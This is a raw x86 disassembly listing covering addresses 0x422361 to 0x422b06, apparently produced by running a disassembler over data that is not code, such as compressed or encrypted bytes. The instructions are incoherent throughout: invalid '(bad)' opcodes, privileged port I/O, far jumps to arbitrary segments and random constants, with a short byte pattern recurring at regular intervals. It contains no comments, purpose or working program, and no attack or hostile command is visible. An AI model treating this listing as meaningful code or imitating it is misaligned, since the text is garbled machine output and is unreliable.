  422361:	sar    DWORD PTR [eax],cl
  422363:	and    eax,ebp
  422365:	jge    0x422325
  422367:	sbb    eax,0x4262107e
  42236c:	jae    0x42234d
  42236e:	mov    ebx,0xcd9a90de
  422373:	out    dx,al
  422374:	pushf  
  422375:	sub    DWORD PTR [esi-0x25],ebp
  422378:	xlat   BYTE PTR ds:[ebx]
  422379:	dec    ebp
  42237a:	leave  
  42237b:	test   BYTE PTR [eax],0x0
  42237e:	add    BYTE PTR [eax],al
  422380:	add    BYTE PTR [eax],al
  422382:	cmp    BYTE PTR [edx-0x6a],ch
  422385:	add    edx,esi
  422387:	(bad)  
  422388:	mov    ebp,0xdb4ef67b
  42238d:	out    0xb5,eax
  42238f:	aaa    
  422390:	and    al,0x3a
  422392:	sbb    edx,ebx
  422394:	add    DWORD PTR [eax],eax
  422396:	bound  eax,QWORD PTR [eax]
  422398:	add    BYTE PTR [eax],al
  42239a:	out    0xcf,al
  42239c:	out    dx,eax
  42239d:	inc    eax
  42239e:	stos   DWORD PTR es:[edi],eax
  42239f:	cmp    al,0x1a
  4223a1:	inc    ebx
  4223a2:	add    al,0xc0
  4223a4:	jns    0x422418
  4223a6:	push   ebx
  4223a7:	sub    ch,dh
  4223a9:	clc    
  4223aa:	pop    ecx
  4223ab:	xor    eax,DWORD PTR [esi-0x442f3ee2]
  4223b1:	int    0xd7
  4223b3:	in     eax,0xf6
  4223b5:	push   ebp
  4223b6:	fdivr  DWORD PTR [ebx+eax*1+0x2be65f66]
  4223bd:	xor    al,0xa9
  4223bf:	enter  0xc03f,0xea
  4223c3:	dec    ebx
  4223c4:	cdq    
  4223c5:	dec    esi
  4223c6:	lds    edx,FWORD PTR [ebx+0x49]
  4223c9:	sbb    BYTE PTR ds:0x7a0c4bca,dh
  4223cf:	scas   al,BYTE PTR es:[edi]
  4223d0:	les    edi,FWORD PTR [edx+0x23]
  4223d3:	add    al,0x32
  4223d5:	xchg   ebp,eax
  4223d6:	dec    esp
  4223d7:	jmp    0xe0ec:0x68975e5c
  4223de:	pop    ebp
  4223df:	fs icebp 
  4223e1:	sub    dh,BYTE PTR [ebx-0x12]
  4223e4:	push   edi
  4223e5:	jmp    0x422466
  4223e7:	or     BYTE PTR [ebx+0x465aff57],bl
  4223ed:	retf   
  4223ee:	push   edx
  4223ef:	jl     0x4223eb
  4223f1:	jge    0x422414
  4223f3:	pop    ss
  4223f4:	xchg   edi,eax
  4223f5:	xchg   ebp,eax
  4223f6:	mov    bl,0x4e
  4223f8:	mov    cs,WORD PTR ds:0xb2b8
  4223fe:	add    BYTE PTR [eax],al
  422400:	add    BYTE PTR [eax],al
  422402:	jmp    0x7a729ec0
  422407:	repz jmp 0x422403
  42240a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42240e:	es sahf 
  422410:	or     BYTE PTR [ebx],ch
  422412:	jnp    0x4223ee
  422414:	add    DWORD PTR [eax],eax
  422416:	bound  eax,QWORD PTR [eax]
  422418:	add    BYTE PTR [eax],al
  42241a:	and    ebp,DWORD PTR [ebx+0x48]
  42241d:	mov    ?,WORD PTR [edx]
  42241f:	cld    
  422420:	xor    BYTE PTR [ebp-0xd],dh
  422423:	popf   
  422424:	out    dx,eax
  422425:	sbb    ah,dl
  422427:	outs   dx,DWORD PTR ds:[esi]
  422428:	push   cs
  422429:	mov    cl,BYTE PTR [ebx+eiz*8]
  42242c:	mov    eax,0xea6110de
  422431:	jae    0x4223c4
  422433:	mov    ch,0xc0
  422435:	pop    ecx
  422436:	lods   eax,DWORD PTR ds:[esi]
  422437:	daa    
  422438:	add    eax,ebp
  42243a:	or     bl,0xdb
  42243d:	pop    edi
  42243e:	inc    ebx
  42243f:	cmp    dl,0xd5
  422442:	push   esi
  422443:	xor    al,0x99
  422445:	scas   al,BYTE PTR es:[edi]
  422446:	fisub  WORD PTR [edx+0x6d06a571]
  42244c:	pop    edx
  42244d:	mov    edx,edx
  42244f:	xor    DWORD PTR [eax-0x21416992],ebp
  422455:	repnz or al,0xf8
  422458:	sub    al,0xa5
  42245a:	aas    
  42245b:	mov    ecx,0x687aabec
  422460:	mov    eax,0xce49ccc1
  422465:	sub    ch,ah
  422467:	pushf  
  422468:	pop    ecx
  422469:	cmp    esp,DWORD PTR [ebx+0x72155842]
  42246f:	sub    eax,0xf381b66b
  422474:	aad    0xc6
  422476:	into   
  422477:	int    0xee
  422479:	scas   al,BYTE PTR es:[edi]
  42247a:	dec    edx
  42247b:	xor    al,BYTE PTR [eax]
  42247d:	add    BYTE PTR [eax],al
  42247f:	add    BYTE PTR [eax],al
  422481:	add    BYTE PTR [ebx+0x41],bl
  422484:	pop    ebx
  422485:	iret   
  422486:	pop    ebx
  422487:	(bad)  
  422489:	aad    0xf
  42248b:	ss dec esp
  42248d:	dec    esi
  42248e:	xchg   ebx,eax
  42248f:	add    al,0x1a
  422491:	data16 fstp st(2)
  422494:	add    DWORD PTR [eax],eax
  422496:	bound  eax,QWORD PTR [eax]
  422498:	add    BYTE PTR [eax],al
  42249a:	imul   ebp,DWORD PTR [ecx+esi*4+0x20927d61],0x73506996
  4224a5:	outs   dx,BYTE PTR ds:[esi]
  4224a6:	in     eax,dx
  4224a7:	xor    DWORD PTR [edi+eax*4],esp
  4224aa:	and    bl,cl
  4224ac:	and    edx,DWORD PTR [ebp-0x61]
  4224af:	bound  ebx,QWORD PTR [esi+ebx*4+0x53088766]
  4224b6:	lods   al,BYTE PTR ds:[esi]
  4224b7:	cmp    ch,bl
  4224b9:	cmc    
  4224ba:	cmp    ecx,DWORD PTR [esi]
  4224bc:	outs   dx,DWORD PTR ds:[esi]
  4224bd:	adc    BYTE PTR [ebx-0x7ef0cfe],al
  4224c3:	mov    ?,edi
  4224c5:	dec    esi
  4224c6:	aam    0x63
  4224c8:	mov    ecx,0x10d7ad71
  4224cd:	mov    ebx,0x4981c1b4
  4224d2:	push   ss
  4224d3:	and    edi,edx
  4224d5:	ins    DWORD PTR es:[edi],dx
  4224d6:	add    dh,BYTE PTR [edi+0x4567cd74]
  4224dc:	mov    WORD PTR [eax-0x1dc171e1],?
  4224e2:	out    0xac,al
  4224e4:	repnz mov bh,0xc4
  4224e7:	adc    ebp,DWORD PTR ds:0x9e4fb59f
  4224ed:	mov    dl,0xf2
  4224ef:	lods   al,BYTE PTR ds:[esi]
  4224f0:	test   eax,0x66b3aefd
  4224f5:	rcl    ebx,1
  4224f7:	mov    al,0x7f
  4224f9:	jg     0x4224ae
  4224fb:	jge    0x4224fd
  4224fd:	add    BYTE PTR [eax],al
  4224ff:	add    BYTE PTR [eax],al
  422501:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422507:	cld    
  422508:	(bad)  [edi-0x65be08a1]
  42250e:	sti    
  42250f:	iret   
  422510:	adc    DWORD PTR ds:0x1db3f,ecx
  422516:	bound  eax,QWORD PTR [eax]
  422518:	add    BYTE PTR [eax],al
  42251a:	lds    eax,FWORD PTR [ebp-0x31]
  42251d:	and    al,BYTE PTR [ecx-0x7f]
  422520:	mov    eax,ds:0xe8c9af5c
  422525:	lock jno 0x42252c
  422528:	leave  
  422529:	xor    BYTE PTR [ecx+0x7],dh
  42252c:	adc    DWORD PTR ds:0xad36a9e6,esi
  422532:	lods   al,BYTE PTR ds:[esi]
  422533:	out    0x3b,al
  422535:	pop    ecx
  422536:	leave  
  422537:	scas   al,BYTE PTR es:[edi]
  422538:	mov    ds:0xf95fa20,al
  42253d:	or     BYTE PTR [eax+0xa],al
  422540:	xchg   edx,eax
  422541:	xchg   ebx,eax
  422542:	lods   al,BYTE PTR ds:[esi]
  422543:	mov    eax,0x813b1586
  422548:	sbb    DWORD PTR [eax+0x54],edi
  42254b:	iret   
  42254c:	dec    ebx
  42254d:	retf   0xd48b
  422550:	fcomp  st(5)
  422552:	mov    bh,0x99
  422554:	xchg   DWORD PTR [edx],edx
  422556:	lahf   
  422557:	adc    esi,ebx
  422559:	mov    DWORD PTR [esi+esi*2-0x72],edx
  42255d:	fwait
  42255e:	lea    edx,[ebp-0x468e81d]
  422564:	sbb    al,0xc9
  422566:	mov    DWORD PTR [eax],esi
  422568:	or     ecx,DWORD PTR [edx+esi*4-0x3]
  42256c:	and    al,0x69
  42256e:	sub    edi,DWORD PTR es:[edi+eax*2+0x5c9300b3]
  422576:	out    0x5f,eax
  422578:	mov    WORD PTR [esi],cs
  42257a:	outs   dx,BYTE PTR ds:[esi]
  42257b:	adc    eax,0x0
  422580:	add    BYTE PTR [eax],al
  422582:	outs   dx,BYTE PTR ds:[esi]
  422583:	jae    0x422575
  422585:	retf   0xcbfd
  422588:	jle    0x422581
  42258a:	repz xor eax,0xd57d8ce9
  422590:	daa    
  422591:	mov    dl,0xa1
  422593:	fild   DWORD PTR [ecx]
  422595:	add    BYTE PTR [edx+0x0],ah
  422598:	add    BYTE PTR [eax],al
  42259a:	sti    
  42259b:	into   
  42259c:	cli    
  42259d:	mov    ebx,DWORD PTR ds:0x24891da1
  4225a3:	add    eax,0x89b8aca7
  4225a8:	dec    edi
  4225a9:	pop    ebx
  4225aa:	mov    cs,eax
  4225ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225ad:	mov    eax,DWORD PTR [esi]
  4225af:	add    BYTE PTR ds:0x1b502e40,cl
  4225b5:	loopne 0x4225d3
  4225b7:	out    dx,al
  4225b8:	pop    ecx
  4225b9:	mov    edi,0x8fbfd7cb
  4225be:	mov    edi,0x7821f1a0
  4225c3:	push   DWORD PTR [ecx-0x3a]
  4225c6:	int3   
  4225c7:	mov    cl,0x67
  4225c9:	and    al,0xf7
  4225cb:	sub    BYTE PTR [edi],al
  4225cd:	push   esp
  4225ce:	sub    eax,0x91542767
  4225d3:	mov    cl,0xe1
  4225d5:	loop   0x42263c
  4225d7:	out    dx,al
  4225d8:	jp     0x4225b3
  4225da:	test   al,ah
  4225dc:	fistp  QWORD PTR [edi]
  4225de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225df:	sar    edx,1
  4225e1:	inc    edi
  4225e2:	(bad)  
  4225e3:	icebp  
  4225e4:	std    
  4225e5:	arpl   WORD PTR [esp+ebp*2+0x6f7210d9],bx
  4225ec:	(bad)  
  4225ed:	jmp    0x422574
  4225ef:	sbb    ebx,DWORD PTR [eax+0x269fdeca]
  4225f5:	and    eax,0x652b3381
  4225fa:	mov    eax,0x16
  4225ff:	add    BYTE PTR [eax],al
  422601:	add    ch,dh
  422603:	adc    al,0xae
  422605:	adc    ebp,edi
  422607:	mov    ebx,0x84e6f6fd
  42260c:	lds    ebp,FWORD PTR [edx-0x6982bfe1]
  422612:	add    ebx,esp
  422614:	add    DWORD PTR [eax],eax
  422616:	bound  eax,QWORD PTR [eax]
  422618:	add    BYTE PTR [eax],al
  42261a:	mov    ecx,0x28ebb913
  42261f:	jmp    0x8c34:0x681771a8
  422626:	jle    0x4225bb
  422628:	int    0x4d
  42262a:	in     eax,0x79
  42262c:	call   FWORD PTR [ecx+0x91090a2]
  422632:	push   ebp
  422633:	xchg   DWORD PTR [ebp-0x70],eax
  422636:	int    0x47
  422638:	jbe    0x422610
  42263a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263b:	add    DWORD PTR [esi+0x43],edx
  42263e:	scas   eax,DWORD PTR es:[edi]
  42263f:	push   eax
  422640:	xor    al,ch
  422642:	fistp  WORD PTR [esi-0x35]
  422645:	rol    BYTE PTR [ecx+ecx*4],cl
  422648:	(bad)  
  422649:	jmp    DWORD PTR [edi+edx*2-0x2bca51e0]
  422650:	imul   eax,DWORD PTR [ebx+0x51],0xffffffb7
  422654:	loop   0x4226d1
  422656:	lahf   
  422657:	xchg   esp,eax
  422658:	in     eax,0x18
  42265a:	sbb    eax,0x486dc3d7
  42265f:	mov    eax,ds:0x3fda5d00
  422664:	sbb    BYTE PTR [edx],0x19
  422667:	outs   dx,BYTE PTR ds:[esi]
  422668:	popa   
  422669:	sub    eax,0x9e4838b2
  42266e:	or     dh,BYTE PTR [eax-0x3e]
  422671:	ret    
  422672:	mov    dl,0x6c
  422675:	sub    dh,BYTE PTR [ebx-0x56]
  422678:	test   DWORD PTR [edx-0x7c],edi
  42267b:	fld    QWORD PTR [eax]
  42267d:	add    BYTE PTR [eax],al
  42267f:	add    BYTE PTR [eax],al
  422681:	add    BYTE PTR [ebx],bh
  422683:	mov    cl,0x57
  422685:	lock fcomip st,st(6)
  422688:	mov    edi,0xbb1c16fb
  42268d:	rol    BYTE PTR [ecx-0xa],0xbf
  422691:	out    dx,al
  422692:	fadd   QWORD PTR gs:[ecx]
  422695:	add    BYTE PTR [edx+0x0],ah
  422698:	add    BYTE PTR [eax],al
  42269a:	pop    ebp
  42269b:	sub    edi,DWORD PTR [edi+0x59]
  42269e:	push   cs
  42269f:	std    
  4226a0:	(bad)  
  4226a1:	mov    ds:0x1710417c,eax
  4226a6:	ja     0x4226e5
  4226a8:	pop    es
  4226a9:	mov    WORD PTR [ecx+0x71],ss
  4226ac:	shl    BYTE PTR [ebp-0x73],1
  4226af:	jmp    0x14c723ad
  4226b4:	popa   
  4226b5:	xor    ebp,DWORD PTR [esi-0x39472135]
  4226bb:	test   eax,0xc16dfa44
  4226c0:	sub    ebx,edi
  4226c2:	xchg   edx,eax
  4226c4:	(bad)  
  4226c6:	adc    eax,0xefbe19be
  4226cb:	mov    BYTE PTR [eax+ebp*1],bh
  4226ce:	imul   dl
  4226d0:	cwde   
  4226d1:	inc    ebx
  4226d2:	mov    BYTE PTR es:[edx-0x3d5df5b2],cl
  4226d9:	in     al,dx
  4226da:	int3   
  4226db:	pop    ebp
  4226dc:	xlat   BYTE PTR ds:[ebx]
  4226dd:	pop    edi
  4226de:	mov    DWORD PTR [edx+edi*2+0x6],edx
  4226e2:	sub    eax,0xa55eae8f
  4226e7:	lods   al,BYTE PTR ds:[esi]
  4226e8:	fs in  eax,dx
  4226ea:	clc    
  4226eb:	js     0x4226e9
  4226ed:	stos   DWORD PTR es:[edi],eax
  4226ee:	imul   bx,ax,0xffaa
  4226f2:	hlt    
  4226f3:	and    al,0xfa
  4226f5:	jnp    0x42270b
  4226f7:	jmp    0xee4c0fae
  4226fc:	add    BYTE PTR [eax],al
  4226fe:	add    BYTE PTR [eax],al
  422700:	add    BYTE PTR [eax],al
  422702:	aam    0xf
  422704:	push   ecx
  422705:	lock (bad) 
  422708:	cmc    
  422709:	das    
  42270a:	sbb    BYTE PTR [eax],cl
  42270c:	xchg   ebx,eax
  42270d:	iret   
  42270e:	and    ebp,DWORD PTR [ebp-0x64]
  422711:	dec    esp
  422712:	(bad)  
  422713:	fadd   QWORD PTR [ecx]
  422715:	add    BYTE PTR [edx+0x0],ah
  422718:	add    BYTE PTR [eax],al
  42271a:	pop    edx
  42271b:	sti    
  42271c:	add    eax,0x4707cb0d
  422721:	push   ss
  422722:	iret   
  422723:	xchg   BYTE PTR [ebp+0x54],ch
  422726:	inc    edi
  422727:	fistp  QWORD PTR [ecx]
  422729:	jno    0x422726
  42272b:	ret    
  42272c:	push   ebx
  42272d:	mov    dl,0x2b
  42272f:	mov    edi,0xccd101dd
  422734:	loop   0x422706
  422736:	imul   esp,DWORD PTR [edx],0xc734f41c
  42273c:	ret    0xc16f
  42273f:	aad    0xf8
  422741:	push   ecx
  422742:	mov    bh,0xfe
  422744:	outs   dx,DWORD PTR ds:[esi]
  422745:	pop    edx
  422746:	dec    edx
  422747:	jne    0x4226d0
  422749:	sbb    dh,BYTE PTR [esp+ebx*8-0x5c1d49d]
  422750:	repnz pop edx
  422752:	inc    esp
  422753:	rol    dh,cl
  422755:	gs dec ebp
  422757:	loop   0x4226fc
  422759:	aaa    
  42275a:	jecxz  0x422785
  42275c:	xchg   dh,dl
  42275e:	xchg   edi,eax
  42275f:	mov    ah,0x8e
  422761:	mov    cl,0xde
  422763:	ficomp WORD PTR [esi]
  422765:	add    al,0x3e
  422767:	in     al,dx
  422768:	fsincos 
  42276a:	ss aaa 
  42276c:	mov    edi,0x2d1ece79
  422771:	cmp    eax,0x7881ee27
  422776:	stc    
  422777:	lea    ebp,[edi+ebx*4-0x31]
  42277b:	jns    0x42277d
  42277d:	add    BYTE PTR [eax],al
  42277f:	add    BYTE PTR [eax],al
  422781:	add    ch,cl
  422783:	sub    eax,0xfbf54395
  422788:	fild   QWORD PTR [edi-0x5bdf5fa9]
  42278e:	adc    ecx,esp
  422790:	mov    ah,0xee
  422792:	sub    ebp,ebx
  422794:	add    DWORD PTR [eax],eax
  422796:	bound  eax,QWORD PTR [eax]
  422798:	add    BYTE PTR [eax],al
  42279a:	mov    eax,ds:0x79daeaab
  42279f:	out    0x9e,al
  4227a1:	imul   eax,DWORD PTR [esi-0x2a],0xe3aec4d7
  4227a8:	test   BYTE PTR [ecx+ebp*1],ch
  4227ab:	xchg   edx,eax
  4227ac:	cli    
  4227ad:	cmp    DWORD PTR [edi-0x58],0x71d2ddf6
  4227b4:	xor    eax,0x9ff12677
  4227b9:	adc    al,0xf
  4227bb:	int3   
  4227bc:	mov    edi,0x8a9b5fea
  4227c1:	ins    DWORD PTR es:[edi],dx
  4227c2:	pop    es
  4227c3:	jmp    0x422768
  4227c5:	xor    DWORD PTR [ebx+0x8],0x50b5c12a
  4227cc:	jo     0x422786
  4227ce:	cmp    al,0x88
  4227d0:	pop    ebp
  4227d1:	mov    al,ds:0x56eb4788
  4227d6:	bound  ecx,QWORD PTR [ebx-0x18188487]
  4227dc:	dec    edi
  4227dd:	xchg   ecx,eax
  4227de:	cs das 
  4227e0:	es dec edx
  4227e2:	inc    ebp
  4227e3:	and    al,ah
  4227e5:	fcomp  QWORD PTR [edx]
  4227e7:	lea    ebp,[edx-0x13]
  4227ea:	out    0x85,eax
  4227ec:	inc    esi
  4227ed:	mov    al,BYTE PTR [esi]
  4227ef:	push   ecx
  4227f0:	and    ch,ah
  4227f2:	lock out 0xf2,eax
  4227f5:	or     eax,0xcf988698
  4227fa:	push   esp
  4227fb:	mov    DWORD PTR [eax],0x0
  422801:	add    BYTE PTR [ebx],dl
  422803:	fs out 0xb,eax
  422806:	test   DWORD PTR [ebx-0xce58301],0x1c654cfc
  422810:	pop    ebp
  422811:	retf   0xdd8b
  422814:	add    DWORD PTR [eax],eax
  422816:	bound  eax,QWORD PTR [eax]
  422818:	add    BYTE PTR [eax],al
  42281a:	or     BYTE PTR [eax],ah
  42281c:	sahf   
  42281d:	test   al,0xad
  42281f:	jne    0x4227a4
  422821:	sbb    bh,bl
  422823:	or     DWORD PTR [edx+0x79],edi
  422826:	jl     0x4227f4
  422828:	sub    DWORD PTR [ebx],0xffffff8c
  42282b:	out    0x5e,eax
  42282d:	jl     0x422875
  42282f:	sbb    eax,DWORD PTR [ebx]
  422831:	push   ecx
  422832:	mov    ecx,0xae4d89e1
  422837:	jle    0x42287d
  422839:	mov    WORD PTR [esi],gs
  42283b:	jbe    0x422856
  42283d:	sahf   
  42283e:	xor    eax,0x276245f7
  422843:	out    dx,al
  422844:	pmaxsw mm2,QWORD PTR [ebx-0x4241b0fd]
  42284b:	adc    BYTE PTR [eax+0x1f235f33],ch
  422851:	xchg   BYTE PTR [edx-0x49],al
  422854:	imul   ebx,DWORD PTR [edi],0xed0463af
  42285a:	adc    edi,0xeef61ce2
  422860:	sub    edx,eax
  422862:	ret    0xc84
  422865:	jp     0x4228be
  422867:	push   ecx
  422868:	sub    DWORD PTR [ebp+0x37f0e072],ebx
  42286e:	add    eax,esi
  422870:	jle    0x42281c
  422872:	inc    edx
  422873:	enter  0x1dfc,0x9
  422877:	cmp    ch,cl
  422879:	(bad)  
  42287a:	xchg   ebx,eax
  42287b:	js     0x42287d
  42287d:	add    BYTE PTR [eax],al
  42287f:	add    BYTE PTR [eax],al
  422881:	add    BYTE PTR [edi],ah
  422883:	push   ecx
  422884:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  42288e:	or     BYTE PTR [ecx-0x67],dl
  422891:	and    eax,0x1dded
  422896:	bound  eax,QWORD PTR [eax]
  422898:	add    BYTE PTR [eax],al
  42289a:	shr    DWORD PTR [esi-0x11],cl
  42289d:	dec    ecx
  42289e:	pop    ss
  42289f:	ret    0xacaf
  4228a2:	pop    esp
  4228a3:	pop    esi
  4228a4:	mov    bh,0x79
  4228a6:	hlt    
  4228a7:	es hlt 
  4228a9:	xor    ch,ch
  4228ab:	push   ss
  4228ac:	sar    BYTE PTR [eax-0x49],cl
  4228af:	adc    dl,BYTE PTR [ebp+0x6c]
  4228b2:	or     eax,eax
  4228b4:	rcl    BYTE PTR [ebx],cl
  4228b6:	sub    BYTE PTR [ebx],0xa5
  4228b9:	lds    ebp,FWORD PTR [ebp+eiz*2-0x9bf4ee9]
  4228c0:	nop
  4228c1:	mov    esi,0x7584711b
  4228c6:	jbe    0x4228eb
  4228c8:	and    esi,DWORD PTR [ebx]
  4228ca:	and    esp,DWORD PTR [esi]
  4228cc:	fidivr DWORD PTR [esi]
  4228ce:	jle    0x422860
  4228d0:	mov    edi,0xecd683d2
  4228d5:	or     ch,BYTE PTR [ebx-0x4915ddd6]
  4228db:	cmp    al,0x5d
  4228dd:	repz ficom DWORD PTR [edi]
  4228e0:	pop    ds
  4228e1:	ja     0x42288b
  4228e3:	sahf   
  4228e4:	in     eax,dx
  4228e5:	pop    edx
  4228e6:	sub    BYTE PTR [edx+0x1d],bh
  4228e9:	jae    0x422872
  4228eb:	xor    bh,BYTE PTR [ebp+ecx*8-0x73]
  4228ef:	sbb    al,0xa3
  4228f1:	(bad)  
  4228f2:	mov    edx,0x2e023446
  4228f7:	or     bh,BYTE PTR [eax+0x18]
  4228fa:	push   esi
  4228fb:	fld    QWORD PTR [eax]
  4228fd:	add    BYTE PTR [eax],al
  4228ff:	add    BYTE PTR [eax],al
  422901:	add    BYTE PTR [esi],dh
  422903:	add    dl,BYTE PTR [ebp+0xc]
  422906:	jne    0x422967
  422908:	jg     0x422944
  42290a:	clc    
  42290b:	cs aas 
  42290d:	push   0x466d02e7
  422912:	and    eax,0x620001d0
  422917:	add    BYTE PTR [eax],al
  422919:	add    cl,ch
  42291b:	mov    edx,0xe5e42b04
  422920:	aam    0x19
  422922:	cmc    
  422923:	stc    
  422924:	add    al,0xa2
  422926:	sbb    al,0x15
  422928:	clc    
  422929:	push   edx
  42292a:	aam    0x80
  42292c:	xor    DWORD PTR [ebx+0x3d],0x72
  422930:	dec    esp
  422931:	adc    edi,DWORD PTR [edx+0x7b]
  422934:	mov    ds:0xcabded24,eax
  422939:	(bad)
  42293c:	test   eax,0x7e395a77
  422941:	mov    WORD PTR ds:0xf4982b39,?
  422947:	dec    ebx
  422948:	ins    BYTE PTR es:[edi],dx
  422949:	xor    BYTE PTR [edx-0x3d21e86],ah
  42294f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422950:	outs   dx,BYTE PTR ds:[esi]
  422951:	sti    
  422952:	inc    esp
  422953:	push   0x59
  422955:	enter  0x6cce,0xfb
  422959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42295a:	sub    al,BYTE PTR [ecx+0x7f]
  42295d:	cmp    eax,0x4fc1f080
  422962:	out    dx,al
  422963:	out    dx,eax
  422964:	xchg   DWORD PTR [ecx+0x1b],eax
  422967:	adc    al,0xad
  422969:	lods   al,BYTE PTR ds:[esi]
  42296a:	test   eax,0xc396ea1
  42296f:	push   0x52
  422971:	push   ss
  422972:	mov    bh,0xc9
  422974:	ins    DWORD PTR es:[edi],dx
  422975:	jge    0x422944
  422977:	xor    DWORD PTR [eax+0x1d],ebx
  42297a:	add    al,0xfb
  42297c:	add    BYTE PTR [eax],al
  42297e:	add    BYTE PTR [eax],al
  422980:	add    BYTE PTR [eax],al
  422982:	or     BYTE PTR [ecx-0x404c48e],dh
  422988:	dec    ecx
  422989:	mov    bl,0x94
  42298b:	je     0x422964
  42298d:	call   0xd087:0xd42e5ec2
  422994:	add    DWORD PTR [eax],eax
  422996:	bound  eax,QWORD PTR [eax]
  422998:	add    BYTE PTR [eax],al
  42299a:	inc    edx
  42299b:	jmp    0x35bb:0x2a2579ea
  4229a2:	std    
  4229a3:	ficom  WORD PTR [ebx]
  4229a5:	scas   al,BYTE PTR es:[edi]
  4229a6:	int3   
  4229a7:	sti    
  4229a8:	call   0x30ce:0xfe8eaa04
  4229af:	cli    
  4229b0:	imul   ebp,DWORD PTR [ebx+0x3c951c7f],0xffffff99
  4229b7:	aaa    
  4229b8:	into   
  4229b9:	add    al,0x27
  4229bb:	inc    ecx
  4229bc:	adc    bh,BYTE PTR [edi]
  4229be:	fldcw  WORD PTR [edi-0x68]
  4229c1:	pop    esi
  4229c2:	test   al,0xd0
  4229c4:	aas    
  4229c5:	stos   BYTE PTR es:[edi],al
  4229c6:	mov    ebp,0x34d28821
  4229cb:	ds in  eax,0xf4
  4229ce:	out    dx,eax
  4229cf:	not    dh
  4229d1:	cli    
  4229d2:	scas   al,BYTE PTR es:[edi]
  4229d3:	add    eax,0x4f5c6907
  4229d8:	jmp    0x42298b
  4229da:	ds gs leave 
  4229dd:	jae    0x4229cf
  4229df:	shr    ecx,cl
  4229e1:	adc    ecx,0xe2038870
  4229e7:	xchg   BYTE PTR [edi-0x33],dl
  4229ea:	add    DWORD PTR [esp+eax*2+0x4ecd4687],eax
  4229f1:	add    DWORD PTR [ebx-0x74743fa2],esi
  4229f7:	stos   DWORD PTR es:[edi],eax
  4229f8:	jl     0x422a4d
  4229fa:	push   ecx
  4229fb:	jne    0x4229fd
  4229fd:	add    BYTE PTR [eax],al
  4229ff:	add    BYTE PTR [eax],al
  422a01:	add    bh,bl
  422a03:	push   ebx
  422a04:	mov    dl,0x4f
  422a06:	mov    esi,0x67d3ffef
  422a0b:	xchg   ecx,edi
  422a0d:	adc    al,0xc
  422a0f:	mov    edx,0xd0e9ca95
  422a14:	add    DWORD PTR [eax],eax
  422a16:	bound  eax,QWORD PTR [eax]
  422a18:	add    BYTE PTR [eax],al
  422a1a:	sub    BYTE PTR [edi],al
  422a1c:	xchg   edx,eax
  422a1d:	ret    0x20a4
  422a20:	push   eax
  422a21:	and    DWORD PTR [ebp+0x3771ae1],edx
  422a27:	push   cs
  422a28:	inc    edi
  422a29:	jb     0x422a3b
  422a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a2c:	sbb    esp,DWORD PTR [ecx]
  422a2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a2f:	mov    al,ds:0x9b16dd1d
  422a34:	sbb    al,0x94
  422a36:	adc    BYTE PTR [ebx+0x3f],al
  422a39:	cmovne edx,DWORD PTR [ebp-0x61]
  422a3d:	into   
  422a3e:	pop    eax
  422a3f:	(bad)  
  422a40:	jge    0x422a86
  422a42:	mov    al,ds:0x2d6f6d6c
  422a47:	jp     0x422a1a
  422a49:	lods   al,BYTE PTR ds:[esi]
  422a4a:	int3   
  422a4b:	pop    edx
  422a4c:	adc    eax,0xa9ee4d13
  422a51:	jmp    0x422a9d
  422a53:	inc    esi
  422a54:	dec    esi
  422a55:	push   eax
  422a56:	and    BYTE PTR [ebx-0x1c],0xd5
  422a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a5b:	stos   BYTE PTR es:[edi],al
  422a5c:	shl    BYTE PTR [edx-0x3af484f1],0xba
  422a63:	jnp    0x422a20
  422a65:	aad    0xe4
  422a67:	fld    QWORD PTR [edi-0x78]
  422a6a:	add    al,0x42
  422a6c:	jmp    0xcb4b2f80
  422a71:	pop    esp
  422a72:	mov    bl,0x1c
  422a74:	retf   
  422a75:	aam    0x9d
  422a77:	jle    0x422a76
  422a79:	mov    edx,0x4507
  422a7e:	add    BYTE PTR [eax],al
  422a80:	add    BYTE PTR [eax],al
  422a82:	xchg   DWORD PTR [ebx+edx*8],ecx
  422a85:	fcmovu st,st(3)
  422a87:	fisttp WORD PTR [edi+0x640ccb5d]
  422a8d:	push   ss
  422a8e:	dec    edi
  422a8f:	push   eax
  422a90:	test   BYTE PTR [edx+0x4b],0xd1
  422a94:	add    DWORD PTR [eax],eax
  422a96:	bound  eax,QWORD PTR [eax]
  422a98:	add    BYTE PTR [eax],al
  422a9a:	xchg   ebp,eax
  422a9b:	adc    eax,0x898f32ed
  422aa0:	pusha  
  422aa1:	push   esi
  422aa2:	iret   
  422aa3:	mov    al,0x2e
  422aa5:	inc    eax
  422aa6:	nop
  422aa7:	sbb    ecx,DWORD PTR ds:0x172b19e9
  422aad:	sub    DWORD PTR [esi-0x4c],esp
  422ab0:	pmaddwd mm2,mm2
  422ab3:	daa    
  422ab4:	out    dx,eax
  422ab5:	mov    ebx,0xeac888f
  422aba:	mov    al,0xb6
  422abc:	cmp    eax,0x24a3eafa
  422ac1:	and    BYTE PTR [ebp-0x30ce0253],0xb5
  422ac8:	not    BYTE PTR [ebx+0x346f94b2]
  422ace:	leave  
  422acf:	test   DWORD PTR [ecx-0x7cfc00c0],esi
  422ad5:	jecxz  0x422ac7
  422ad7:	push   eax
  422ad8:	mov    al,0xbc
  422ada:	mov    ah,BYTE PTR [edi-0x65]
  422add:	popf   
  422ade:	or     DWORD PTR [ecx-0x286edf66],esp
  422ae4:	rcr    BYTE PTR [edx-0x77047009],cl
  422aea:	into   
  422aeb:	mov    bh,0x90
  422aed:	dec    eax
  422aee:	fidiv  WORD PTR [esi+0x6c]
  422af1:	and    BYTE PTR [esi-0x58122be6],bl
  422af7:	int3   
  422af8:	icebp  
  422af9:	in     eax,dx
  422afa:	ret    
  422afb:	clc    
  422afc:	add    BYTE PTR [eax],al
  422afe:	add    BYTE PTR [eax],al
  422b00:	add    BYTE PTR [eax],al
  422b02:	lahf   
  422b03:	arpl   WORD PTR [ebp+0x72],cx
  422b06:	std    
